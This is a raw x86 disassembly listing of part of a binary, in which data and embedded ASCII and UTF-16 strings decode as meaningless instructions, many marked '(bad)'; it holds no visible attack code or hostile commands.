  427a1a:	xchg   edx,eax
  427a1b:	adc    bh,al
  427a1d:	add    BYTE PTR [eax-0x2aac9380],0x53
  427a24:	clc    
  427a25:	ds xchg esi,eax
  427a27:	xor    BYTE PTR [esi],bl
  427a29:	(bad)  
  427a2a:	adc    al,0xcd
  427a2c:	xchg   esi,eax
  427a2d:	cmp    al,0xcd
  427a2f:	(bad)  
  427a30:	inc    esp
  427a31:	int    0x96
  427a33:	xor    ch,cl
  427a35:	(bad)  
  427a36:	adc    al,0xcd
  427a38:	xchg   esi,eax
  427a39:	xor    ch,cl
  427a3b:	(bad)  
  427a3c:	adc    al,0xcd
  427a3e:	out    0x30,al
  427a40:	int    0xa6
  427a42:	adc    al,0x3b
  427a44:	adc    DWORD PTR [ebx],edi
  427a46:	jecxz  0x427a77
  427a48:	inc    ebp
  427a49:	sti    
  427a4a:	xchg   edx,eax
  427a4b:	shr    ecx,cl
  427a4d:	sub    BYTE PTR [ebx],bh
  427a4f:	fst    QWORD PTR [edx]
  427a51:	clc    
  427a52:	add    BYTE PTR [eax-0x102c9380],0x92
  427a59:	push   ebx
  427a5a:	clc    
  427a5b:	int    0xe6
  427a5d:	cmp    al,0x53
  427a5f:	aad    0xcd
  427a61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a62:	inc    esp
  427a63:	cmp    edi,edx
  427a65:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427a6b:	lea    eax,[edi+ebp*1+0x45]
  427a6f:	loope  0x427a03
  427a71:	cmp    ecx,ebx
  427a73:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427a79:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427a7e:	lea    esi,[eax]
  427a80:	shr    esp,cl
  427a82:	xchg   edx,eax
  427a83:	push   ebx
  427a84:	popf   
  427a85:	xchg   ecx,ebx
  427a87:	int    0x96
  427a89:	adc    al,0x1b
  427a8b:	hlt    
  427a8c:	add    al,0xf2
  427a8e:	std    
  427a8f:	shr    edi,cl
  427a91:	sub    BYTE PTR [ebx],bh
  427a93:	ins    DWORD PTR es:[edi],dx
  427a94:	adc    al,BYTE PTR [edx]
  427a96:	aam    0x37
  427a98:	ficom  WORD PTR [ebx]
  427a9a:	adc    bh,bl
  427a9c:	mov    ebp,0xcd25230a
  427aa1:	out    0x3c,al
  427aa3:	int    0xa6
  427aa5:	inc    esp
  427aa6:	add    al,0xe9
  427aa8:	std    
  427aa9:	adc    bh,al
  427aab:	aam    0x37
  427aad:	ficom  WORD PTR [ebx]
  427aaf:	adc    dh,ah
  427ab1:	mov    ebp,0x8725230a
  427ab6:	lock int 0xe6
  427ab9:	and    al,0x1b
  427abb:	aad    0x53
  427abd:	rcl    BYTE PTR [esi-0x43],cl
  427ac0:	or     ah,BYTE PTR [ebx]
  427ac2:	and    eax,0x12025370
  427ac7:	not    esi
  427ac9:	aaa    
  427aca:	ficom  WORD PTR [ebx]
  427acc:	cwde   
  427acd:	add    dh,dl
  427acf:	xor    al,0x0
  427ad1:	(bad)  
  427ad2:	sub    al,0x9a
  427ad4:	add    dh,dl
  427ad6:	sbb    al,0x0
  427ad8:	(bad)  
  427ad9:	adc    al,0x0
  427adb:	(bad)  
  427adc:	xor    BYTE PTR [eax],al
  427ade:	(bad)  
  427adf:	dec    esp
  427ae0:	add    dh,dl
  427ae2:	mov    BYTE PTR [ebp+0xfef4],bh
  427ae8:	or     cl,BYTE PTR [ebx-0x57557433]
  427aee:	arpl   bx,cx
  427af0:	sar    BYTE PTR [eax+eax*4],cl
  427af3:	int    0x96
  427af5:	mov    ch,cl
  427af7:	(bad)  
  427af8:	dec    esp
  427af9:	int    0xe6
  427afb:	mov    ch,cl
  427afd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427afe:	dec    esp
  427aff:	cmp    esp,ebx
  427b01:	cmp    edx,DWORD PTR [ecx]
  427b03:	das    
  427b04:	inc    ebp
  427b05:	sti    
  427b06:	xchg   edx,eax
  427b07:	shr    ecx,cl
  427b09:	sub    BYTE PTR [edx],dl
  427b0b:	clc    
  427b0c:	add    BYTE PTR [eax-0x102c9380],0x92
  427b13:	cmp    ebx,ebp
  427b15:	push   ebx
  427b16:	aad    0x53
  427b18:	clc    
  427b19:	int    0xe6
  427b1b:	xor    ch,cl
  427b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b1e:	adc    al,0x53
  427b20:	fst    DWORD PTR [ebx-0xc]
  427b23:	or     dl,BYTE PTR [esi+0x14d60a30]
  427b29:	int    0x96
  427b2b:	cmp    al,0xcd
  427b2d:	(bad)  
  427b2e:	inc    esp
  427b2f:	int    0x96
  427b31:	xor    ch,cl
  427b33:	(bad)  
  427b34:	adc    al,0xcd
  427b36:	xchg   esi,eax
  427b37:	mov    ch,cl
  427b39:	(bad)  
  427b3a:	dec    esp
  427b3b:	int    0x96
  427b3d:	mov    ch,cl
  427b3f:	(bad)  
  427b40:	dec    esp
  427b41:	int    0xe6
  427b43:	mov    ch,cl
  427b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b46:	dec    esp
  427b47:	cmp    esp,ebx
  427b49:	cmp    edx,DWORD PTR [ecx]
  427b4b:	das    
  427b4c:	inc    ebp
  427b4d:	sti    
  427b4e:	xchg   edx,eax
  427b4f:	shr    ecx,cl
  427b51:	sub    BYTE PTR [edx],dl
  427b53:	clc    
  427b54:	add    BYTE PTR [eax-0x22c49380],0x53
  427b5b:	aad    0xd3
  427b5d:	out    dx,eax
  427b5e:	xchg   edx,eax
  427b5f:	push   ebx
  427b60:	clc    
  427b61:	int    0xe6
  427b63:	xor    ch,cl
  427b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b66:	adc    al,0x3b
  427b68:	cli    
  427b69:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427b6f:	lea    edx,[edi+ebp*1]
  427b72:	inc    ebp
  427b73:	loope  0x427b07
  427b75:	cmp    ecx,ebx
  427b77:	push   ebx
  427b78:	cli    
  427b79:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427b7f:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427b84:	push   ebx
  427b85:	popf   
  427b86:	int    0x76
  427b88:	cmp    al,0xcd
  427b8a:	lea    eax,[edi+eax*4-0x27]
  427b8e:	int    0xe6
  427b90:	cmp    al,0x1b
  427b92:	hlt    
  427b93:	int    0xa6
  427b95:	inc    esp
  427b96:	adc    al,BYTE PTR [edx]
  427b98:	mov    ebp,0x5625230a
  427b9d:	jnp    0x427bd6
  427b9f:	ficom  WORD PTR [ebx]
  427ba1:	das    
  427ba2:	inc    ebp
  427ba3:	jge    0x427b37
  427ba5:	shr    ecx,cl
  427ba7:	sub    bl,dl
  427ba9:	jmp    0x427b3d
  427bab:	cmp    ebx,ebp
  427bad:	adc    bh,al
  427baf:	add    BYTE PTR [eax-0xfac9380],0x53
  427bb6:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427bbc:	lea    ecx,[eax-0x32b36933]
  427bc2:	out    0x30,al
  427bc4:	int    0xa6
  427bc6:	adc    al,0x4
  427bc8:	repnz std 
  427bca:	add    al,0xe9
  427bcc:	std    
  427bcd:	adc    al,BYTE PTR [edx]
  427bcf:	aam    0x37
  427bd1:	ficom  WORD PTR [ebx]
  427bd3:	adc    bh,al
  427bd5:	aam    0x37
  427bd7:	ficom  WORD PTR [ebx]
  427bd9:	shr    edi,cl
  427bdb:	sub    BYTE PTR [ebx],bh
  427bdd:	ins    DWORD PTR es:[edi],dx
  427bde:	adc    bh,bl
  427be0:	mov    ebp,0x1225230a
  427be5:	hlt    
  427be6:	mov    ebp,0x8725230a
  427beb:	lock sbb edx,ebp
  427bee:	jmp    0x427c37
  427bf0:	inc    DWORD PTR [eax]
  427bf2:	add    BYTE PTR [esi-0x12fb1233],dl
  427bf8:	sbb    al,0x98
  427bfa:	pop    edi
  427bfb:	(bad)  
  427bfc:	aaa    
  427bfd:	ficom  WORD PTR [ebx]
  427bff:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427c05:	and    esp,DWORD PTR ds:0xc9f5760a
  427c0b:	jbe    0x427bca
  427c0d:	xchg   ecx,eax
  427c0e:	aaa    
  427c0f:	ficom  WORD PTR [ebx]
  427c11:	or     dh,BYTE PTR [esi-0x13]
  427c14:	int    0x96
  427c16:	adc    ebp,ecx
  427c18:	(bad)  
  427c19:	cmc    
  427c1a:	call   0xefd3:0x92fb452f
  427c21:	xchg   edx,eax
  427c22:	int    0xd6
  427c24:	adc    ebp,ecx
  427c26:	out    0xf5,al
  427c28:	jo     0x427c3c
  427c2a:	sti    
  427c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c2c:	mov    esi,0x3b4229
  427c31:	jno    0x427c86
  427c33:	(bad)  [edx]
  427c35:	xchg   esi,eax
  427c36:	std    
  427c37:	int    0x96
  427c39:	dec    esp
  427c3a:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427c40:	iret   
  427c41:	jbe    0x427c40
  427c43:	add    dh,dl
  427c45:	mov    bl,dl
  427c47:	mov    ecx,0xd6007028
  427c4c:	dec    esp
  427c4d:	add    dh,dl
  427c4f:	in     eax,dx
  427c50:	add    dh,dl
  427c52:	mov    ebp,0xf5d600
  427c57:	(bad)  
  427c58:	adc    DWORD PTR [ebp+0xfde6],edi
  427c5e:	stos   BYTE PTR es:[edi],al
  427c5f:	or     dh,BYTE PTR [esi-0x3]
  427c62:	int    0x76
  427c64:	std    
  427c65:	test   al,0xcb
  427c67:	ror    BYTE PTR [eax-0x12326980],cl
  427c6d:	add    al,0xb5
  427c6f:	stc    
  427c70:	add    al,0xed
  427c72:	inc    esp
  427c73:	cwde   
  427c74:	leave  
  427c75:	je     0x427cab
  427c77:	xor    al,0x80
  427c79:	add    BYTE PTR [eax+0x3474c980],0x44
  427c80:	add    BYTE PTR [eax+0x74cf8080],0x34
  427c87:	xor    BYTE PTR [eax+0x0],dh
  427c8a:	(bad)  
  427c8b:	xor    al,0x0
  427c8d:	(bad)  
  427c8e:	sub    al,0x0
  427c90:	(bad)  
  427c91:	and    al,0x0
  427c93:	(bad)  
  427c94:	sbb    al,0x0
  427c96:	(bad)  
  427c97:	adc    al,0x0
  427c99:	(bad)  
  427c9a:	xor    BYTE PTR [eax],al
  427c9c:	(bad)  
  427c9d:	dec    esp
  427c9e:	add    dh,dl
  427ca0:	mov    BYTE PTR [ebp+0xe7e7],bh
  427ca6:	int    0x76
  427ca8:	mov    BYTE PTR [edx],cl
  427caa:	je     0x427ce0
  427cac:	test   ch,cl
  427cae:	je     0x427ce4
  427cb0:	xor    al,0x6
  427cb2:	ins    DWORD PTR es:[edi],dx
  427cb3:	das    
  427cb4:	add    eax,0x80808017
  427cb9:	int    0x74
  427cbb:	xor    al,0x44
  427cbd:	push   es
  427cbe:	ins    DWORD PTR es:[edi],dx
  427cbf:	das    
  427cc0:	add    eax,0x8080800a
  427cc5:	add    ah,dl
  427cc7:	xor    al,0x24
  427cc9:	add    ah,dl
  427ccb:	xor    al,0x24
  427ccd:	add    ah,dl
  427ccf:	xor    al,0x24
  427cd1:	int    0x74
  427cd3:	xor    al,0x50
  427cd5:	add    cl,dh
  427cd7:	int    0x74
  427cd9:	xor    al,0x84
  427cdb:	int    0x74
  427cdd:	xor    al,0x84
  427cdf:	int    0x74
  427ce1:	xor    al,0x84
  427ce3:	iret   
  427ce4:	jbe    0x427c6a
  427ce6:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427cea:	int    0x74
  427cec:	xor    al,0x3c
  427cee:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427cf2:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427cf6:	int    0x74
  427cf8:	xor    al,0x84
  427cfa:	int    0x74
  427cfc:	xor    al,0x84
  427cfe:	int    0x8c
  427d00:	xor    al,0x84
  427d02:	int    0xa
  427d04:	and    eax,0xcd808081
  427d09:	xor    ebp,ecx
  427d0b:	aam    0x34
  427d0d:	mov    ch,cl
  427d0f:	add    DWORD PTR ds:0x5e808081,ebp
  427d15:	sbb    BYTE PTR [edi],ch
  427d17:	or     edx,DWORD PTR ds:0xcd808081
  427d1d:	xor    ch,cl
  427d1f:	push   eax
  427d20:	int    0x62
  427d22:	fs iret 
  427d24:	xchg   esp,eax
  427d25:	sbb    BYTE PTR [eax-0x33],dh
  427d28:	push   ecx
  427d29:	int    0x22
  427d2b:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427d31:	pop    esi
  427d32:	sbb    BYTE PTR [edi],ch
  427d34:	add    al,0x7b
  427d36:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427d40:	dec    edx
  427d41:	int    0x80
  427d43:	xor    ecx,DWORD PTR [edi]
  427d45:	xchg   ebx,edx
  427d47:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427d4d:	or     ch,0x74
  427d50:	xor    al,0x44
  427d52:	push   es
  427d53:	ins    DWORD PTR es:[edi],dx
  427d54:	das    
  427d55:	push   es
  427d56:	cwde   
  427d57:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427d61:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427d6b:	je     0x427da1
  427d6d:	test   ch,cl
  427d6f:	add    DWORD PTR ds:0xcd808081,esp
  427d75:	or     BYTE PTR [edx],0x74
  427d78:	xor    al,0x4c
  427d7a:	int    0x74
  427d7c:	xor    al,0x84
  427d7e:	int    0x1
  427d80:	or     DWORD PTR [ecx-0x7f327f80],eax
  427d86:	int    0x80
  427d88:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427d8c:	int    0x74
  427d8e:	xor    al,0x84
  427d90:	int    0x1
  427d92:	int3   
  427d93:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427d9d:	dec    esp
  427d9e:	int    0x74
  427da0:	xor    al,0x84
  427da2:	int    0x8c
  427da4:	xor    al,0x84
  427da6:	int    0x1
  427da8:	popf   
  427da9:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427db3:	or     ch,0x89
  427db6:	imul   edx,ecx,0x3b358621
  427dbc:	jns    0x427dc2
  427dbe:	add    bh,bh
  427dc0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427dc6:	push   ebx
  427dc7:	jge    0x427dd3
  427dc9:	mov    WORD PTR [esp+ecx*2],?
  427dcc:	leave  
  427dcd:	je     0x427e03
  427dcf:	mov    BYTE PTR [eax-0x327f7f80],al
  427dd5:	je     0x427e0b
  427dd7:	xor    al,0x6
  427dd9:	ins    DWORD PTR es:[edi],dx
  427dda:	aam    0x73
  427ddc:	int    0x74
  427dde:	xor    al,0x30
  427de0:	add    al,0xbd
  427de2:	adc    ah,0x52
  427de5:	jl     0x427dbb
  427de7:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427deb:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427def:	add    ah,dl
  427df1:	xor    al,0x2c
  427df3:	add    ah,dl
  427df5:	xor    al,0x2c
  427df7:	add    ah,dl
  427df9:	xor    al,0x2c
  427dfb:	add    ah,dl
  427dfd:	xor    al,0x2c
  427dff:	int    0x74
  427e01:	xor    al,0x54
  427e03:	add    cl,dh
  427e05:	in     al,dx
  427e06:	cmp    BYTE PTR [eax],al
  427e08:	aam    0x34
  427e0a:	and    al,0x0
  427e0c:	aam    0x34
  427e0e:	and    al,0x0
  427e10:	aam    0x34
  427e12:	and    al,0xcd
  427e14:	je     0x427e4a
  427e16:	push   eax
  427e17:	add    cl,dh
  427e19:	in     al,dx
  427e1a:	and    al,BYTE PTR [eax]
  427e1c:	aam    0x34
  427e1e:	adc    al,0xcd
  427e20:	je     0x427e56
  427e22:	cmp    al,0x0
  427e24:	icebp  
  427e25:	in     al,dx
  427e26:	xchg   ch,cl
  427e28:	je     0x427e5e
  427e2a:	xor    al,0x0
  427e2c:	icebp  
  427e2d:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427e31:	int    0x74
  427e33:	xor    al,0x4c
  427e35:	push   es
  427e36:	ins    DWORD PTR es:[edi],dx
  427e37:	aam    0x4e
  427e39:	int    0x74
  427e3b:	xor    al,0x84
  427e3d:	leave  
  427e3e:	add    DWORD PTR [ebp+0x41808081],ebp
  427e44:	and    DWORD PTR [esi+0x3474cd35],eax
  427e4a:	mov    ch,cl
  427e4c:	mov    WORD PTR [esp+eax*4],?
  427e4f:	int    0xa
  427e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e52:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427e5c:	and    DWORD PTR [esi+0x3474cd35],eax
  427e62:	mov    ch,cl
  427e64:	mov    WORD PTR [eax+ecx*4],?
  427e67:	cmp    edi,DWORD PTR [ecx+0x4]
  427e6a:	add    bh,bh
  427e6c:	shl    edx,cl
  427e6e:	sub    bl,dl
  427e70:	mov    ebp,0xcdd35392
  427e75:	mov    WORD PTR [esp+ecx*2],?
  427e78:	inc    ebx
  427e79:	rcl    esi,cl
  427e7b:	and    ecx,ebp
  427e7d:	je     0x427eb3
  427e7f:	test   ch,cl
  427e81:	mov    WORD PTR [esp+eax*4],?
  427e84:	int    0xa
  427e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e87:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427e91:	add    BYTE PTR [eax],0x70
  427e94:	cmp    al,0xec
  427e96:	push   ds
  427e97:	iret   
  427e98:	jbe    0x427e1e
  427e9a:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427e9e:	int    0x74
  427ea0:	xor    al,0x4c
  427ea2:	int    0x8c
  427ea4:	xor    al,0x84
  427ea6:	int    0xa
  427ea8:	in     al,0x81
  427eaa:	add    BYTE PTR [eax-0x777e7633],0xcd
  427eb1:	je     0x427ee7
  427eb3:	test   ch,cl
  427eb5:	add    ebp,ebp
  427eb7:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427ec1:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427ec7:	or     bh,0x84
  427eca:	adc    cl,ch
  427ecc:	mov    WORD PTR [esp+eax*4],?
  427ecf:	int    0xa
  427ed1:	in     al,0x81
  427ed3:	add    BYTE PTR [eax-0x76327f33],0x81
  427eda:	mov    BYTE PTR [eax-0x2d591833],ch
  427ee0:	sub    al,0x80
  427ee2:	lds    edx,FWORD PTR [eax+0x75]
  427ee5:	ins    BYTE PTR es:[edi],dx
  427ee6:	jae    0x427f5f
  427ee8:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427eec:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427ef0:	add    BYTE PTR [ecx+0x74],ah
  427ef3:	ins    BYTE PTR es:[edi],dx
  427ef4:	popa   
  427ef5:	inc    esp
  427ef6:	gs popa 
  427ef8:	fs push 0x6561686d
  427efe:	add    BYTE PTR fs:[ebp+0x74],ah
  427f02:	push   0x65726143
  427f07:	outs   dx,DWORD PTR ds:[esi]
  427f08:	jns    0x427f70
  427f0a:	add    BYTE PTR gs:[edi+0x72],dh
  427f0e:	jns    0x427f7d
  427f10:	popa   
  427f11:	outs   dx,DWORD PTR ds:[esi]
  427f12:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427f16:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427f1a:	push   0x6f6d6568
  427f1f:	add    BYTE PTR fs:[edx+0x65],dl
  427f23:	arpl   WORD PTR [ebx+0x62],si
  427f26:	popa   
  427f27:	ins    BYTE PTR es:[edi],dx
  427f28:	jne    0x427fa2
  427f2a:	gs jae 0x427f2d
  427f2d:	ins    DWORD PTR es:[edi],dx
  427f2e:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427f35:	outs   dx,DWORD PTR ds:[esi]
  427f36:	jb     0x427fa7
  427f38:	jo     0x427f3a
  427f3a:	ja     0x427f9d
  427f3c:	gs je  0x427fae
  427f3f:	jb     0x427fb0
  427f41:	bound  esp,QWORD PTR [ecx+0x70]
  427f44:	add    BYTE PTR [ebx+0x69],cl
  427f47:	outs   dx,BYTE PTR ds:[esi]
  427f48:	addr16 addr16 popa 
  427f4b:	outs   dx,BYTE PTR ds:[esi]
  427f4c:	arpl   WORD PTR [ecx+0x70],sp
  427f4f:	add    BYTE PTR [edi+0x6e],al
  427f52:	jne    0x427fc7
  427f54:	je     0x427fbb
  427f56:	outs   dx,BYTE PTR ds:[esi]
  427f57:	push   esi
  427f58:	popa   
  427f59:	jb     0x427fd4
  427f5b:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427f5f:	jb     0x427fb1
  427f61:	popa   
  427f62:	ins    BYTE PTR es:[edi],dx
  427f63:	ins    DWORD PTR es:[edi],dx
  427f64:	je     0x427fcf
  427f66:	outs   dx,DWORD PTR ds:[esi]
  427f67:	ja     0x427fce
  427f69:	jb     0x427f6b
  427f6b:	jo     0x427fd2
  427f6d:	ins    DWORD PTR es:[edi],dx
  427f6e:	jns    0x427fe4
  427f70:	push   0x6f656562
  427f75:	outs   dx,BYTE PTR ds:[esi]
  427f76:	push   eax
  427f77:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427f7e:	inc    ebx
  427f7f:	outs   dx,DWORD PTR ds:[esi]
  427f80:	popa   
  427f81:	ins    BYTE PTR es:[edi],dx
  427f82:	popa   
  427f83:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427f8a:	je     0x428005
  427f8c:	outs   dx,DWORD PTR gs:[esi]
  427f8e:	outs   dx,BYTE PTR ds:[esi]
  427f8f:	gs ins BYTE PTR es:[edi],dx
  427f91:	inc    ebx
  427f92:	push   0x54007261
  427f97:	jns    0x428009
  427f99:	jns    0x428008
  427f9b:	jne    0x428002
  427f9d:	imul   eax,DWORD PTR gs:[eax],0x70
  427fa1:	outs   dx,DWORD PTR ds:[esi]
  427fa2:	je     0x427fe6
  427fa4:	gs gs jb 0x428018
  427fa8:	outs   dx,DWORD PTR ds:[esi]
  427fa9:	je     0x428016
  427fab:	imul   eax,DWORD PTR [eax],0x616c7548
  427fb1:	jo     0x42801c
  427fb3:	popa   
  427fb4:	ins    BYTE PTR es:[edi],dx
  427fb5:	dec    ebx
  427fb6:	outs   dx,BYTE PTR ds:[esi]
  427fb7:	popa   
  427fb8:	jo     0x428033
  427fba:	add    BYTE PTR gs:[eax+0x6f],dh
  427fbe:	je     0x428002
  427fc0:	gs ins BYTE PTR es:[edi],dx
  427fc2:	jae    0x428033
  427fc4:	js     0x427fc6
  427fc6:	popa   
  427fc7:	data16 je 0x428010
  427fca:	ins    BYTE PTR es:[edi],dx
  427fcb:	popa   
  427fcc:	imul   esp,DWORD PTR [ebp+0x78],0x70
  427fd0:	gs jae 0x428034
  427fd3:	jb     0x427fd5
  427fd5:	inc    edx
  427fd6:	ins    BYTE PTR es:[edi],dx
  427fd7:	popa   
  427fd8:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
  427fdc:	je     0x428044
  427fde:	ins    BYTE PTR es:[edi],dx
  427fdf:	jns    0x428056
  427fe1:	push   0x6d6d6800
  427fe6:	popa   
  427fe7:	inc    edi
  427fe8:	popa   
  427fe9:	ins    BYTE PTR es:[edi],dx
  427fea:	ins    BYTE PTR es:[edi],dx
  427feb:	push   0x48007361
  427ff0:	outs   dx,DWORD PTR ds:[esi]
  427ff1:	ins    DWORD PTR es:[edi],dx
  427ff2:	outs   dx,DWORD PTR gs:[esi]
  427ff4:	jb     0x42805b
  427ff6:	data16 jno 0x428062
  427ff9:	jae    0x42805c
  427ffb:	bound  esi,QWORD PTR [eax+0x61]
  427ffe:	add    BYTE PTR [ebp+0x74],ah
  428001:	outs   dx,BYTE PTR ds:[esi]
  428002:	gs addr16 jbe 0x428067
  428006:	je     0x428081
  428008:	gs popa 
  42800a:	add    BYTE PTR [ebp+0x67],ah
  42800d:	outs   dx,DWORD PTR ds:[esi]
  42800e:	inc    edi
  42800f:	popa   
  428010:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  428018:	jo     0x42807f
  42801a:	fs jbe 0x42807e
  42801d:	je     0x428094
  42801f:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  428023:	outs   dx,DWORD PTR ds:[esi]
  428024:	add    BYTE PTR [edx+0x0],ch
  428027:	jne    0x428029
  428029:	add    BYTE PTR [bp+0x0],ch
  42802d:	popa   
  42802e:	add    BYTE PTR [esi+0x0],ch
  428031:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428036:	add    BYTE PTR [ebp+0x0],dh
  428039:	ins    DWORD PTR es:[edi],dx
  42803a:	add    BYTE PTR [eax],al
  42803c:	add    BYTE PTR [edi+0x0],ch
  42803f:	jb     0x428041
  428041:	ja     0x428043
  428043:	imul   eax,DWORD PTR [eax],0x680073
  428049:	outs   dx,BYTE PTR ds:[esi]
  42804a:	add    BYTE PTR [ecx+0x0],ch
  42804d:	add    BYTE PTR fs:[ecx+0x0],ch
  428051:	ja     0x428053
  428053:	imul   eax,DWORD PTR [eax],0x65006e
  428059:	push   0x70000000
  42805e:	add    BYTE PTR [ecx+0x0],ah
  428061:	je     0x428063
  428063:	jbe    0x428065
  428065:	add    BYTE PTR gs:[ebp+0x0],ah
  428069:	je     0x42806b
  42806b:	add    BYTE PTR gs:[edi+0x0],ah
  42806f:	ins    BYTE PTR es:[edi],dx
  428070:	add    BYTE PTR [ecx+0x0],ah
  428073:	imul   eax,DWORD PTR [eax],0x66
  428079:	outs   dx,DWORD PTR ds:[esi]
  42807a:	add    BYTE PTR [esi+0x0],ch
  42807d:	je     0x42807f
  42807f:	popa   
  428080:	add    BYTE PTR [edi+0x0],dh
  428083:	push   ebx
  428084:	add    BYTE PTR [edi+0x0],ch
  428087:	arpl   WORD PTR [eax],ax
  428089:	imul   eax,DWORD PTR [eax],0x61
  42808c:	add    BYTE PTR [esi+0x0],dh
  42808f:	outs   dx,DWORD PTR ds:[esi]
  428090:	add    BYTE PTR [eax],al
  428092:	add    BYTE PTR [ebp+0x0],ch
  428095:	jns    0x428097
  428097:	add    BYTE PTR gs:[esi+0x0],ah
  42809b:	ins    BYTE PTR es:[edi],dx
  42809c:	add    BYTE PTR [ecx+0x0],ah
  42809f:	jns    0x4280a1
  4280a1:	jbe    0x4280a3
  4280a3:	popa   
  4280a4:	add    BYTE PTR [esi+0x0],ch
  4280a7:	popa   
  4280a8:	add    BYTE PTR [edi+0x0],ah
  4280ab:	outs   dx,DWORD PTR ds:[esi]
  4280ac:	add    BYTE PTR [eax],al
  4280ae:	add    BYTE PTR [edi+0x0],ch
  4280b1:	jb     0x4280b3
  4280b3:	jae    0x4280b5
  4280b5:	imul   eax,DWORD PTR [eax],0x47006e
  4280bb:	imul   eax,DWORD PTR [eax],0x70006d
  4280c1:	bound  eax,QWORD PTR [eax]
  4280c3:	outs   dx,DWORD PTR ds:[esi]
  4280c4:	add    BYTE PTR [eax+0x0],dh
  4280c7:	imul   eax,DWORD PTR [eax],0x650000
  4280cd:	js     0x4280cf
  4280cf:	jae    0x4280d1
  4280d1:	outs   dx,DWORD PTR ds:[esi]
  4280d2:	add    BYTE PTR [ebx+0x0],dh
  4280d5:	popa   
  4280d6:	add    BYTE PTR [esi+0x0],ch
  4280d9:	je     0x4280db
  4280db:	add    BYTE PTR [eax],al
  4280dd:	bound  eax,QWORD PTR [eax]
  4280df:	jns    0x4280e1
  4280e1:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  4280e6:	add    BYTE PTR [eax+eax*1+0x74],ah
  4280ea:	add    BYTE PTR [ecx+0x0],ah
  4280ed:	add    BYTE PTR [eax],al
  4280ef:	js     0x4280f1
  4280f1:	imul   eax,DWORD PTR [eax],0x610054
  4280f7:	imul   eax,DWORD PTR [eax],0x48006e
  4280fd:	popa   
  4280fe:	add    BYTE PTR [esi+0x0],ch
  428101:	add    BYTE PTR fs:[eax],al
  428104:	add    BYTE PTR [edi+0x0],cl
  428107:	ja     0x428109
  428109:	ins    BYTE PTR es:[edi],dx
  42810a:	add    BYTE PTR [ebx+0x0],dh
  42810d:	popa   
  42810e:	add    BYTE PTR [ebx+0x0],dh
  428111:	jo     0x428113
  428113:	popa   
  428114:	add    BYTE PTR [ecx+0x0],ch
  428117:	imul   eax,DWORD PTR [eax],0x72
  42811a:	add    BYTE PTR [ebp+0x0],ah
  42811d:	jbe    0x42811f
  42811f:	add    BYTE PTR [eax],al
  428121:	jb     0x428123
  428123:	jne    0x428125
  428125:	je     0x428127
  428127:	ins    DWORD PTR es:[edi],dx
  428128:	add    BYTE PTR [ebp+0x0],dh
  42812b:	arpl   WORD PTR [eax],ax
  42812d:	jne    0x42812f
  42812f:	jo     0x428131
  428131:	add    BYTE PTR [eax],al
  428133:	jae    0x428135
  428135:	outs   dx,DWORD PTR ds:[esi]
  428136:	add    BYTE PTR [esi+0x0],ah
  428139:	imul   eax,DWORD PTR [eax],0x630062
  42813f:	outs   dx,DWORD PTR ds:[esi]
  428140:	add    BYTE PTR [ecx+0x0],ch
  428143:	jb     0x428145
  428145:	jae    0x428147
  428147:	outs   dx,DWORD PTR ds:[esi]
  428148:	add    BYTE PTR [eax],al
  42814a:	add    BYTE PTR [ebx+0x0],dl
  42814d:	outs   dx,DWORD PTR ds:[esi]
  42814e:	add    BYTE PTR [ebx+0x0],ah
  428151:	popa   
  428152:	add    BYTE PTR [ecx+0x0],ch
  428155:	jae    0x428157
  428157:	data16 add BYTE PTR [ecx+0x0],ah
  42815b:	jb     0x42815d
  42815d:	popa   
  42815e:	add    BYTE PTR [ecx+0x0],ch
  428161:	add    BYTE PTR [eax],al
  428163:	add    BYTE PTR [esi],cl
  428165:	adc    BYTE PTR [eax],al
  428167:	out    0x67,eax
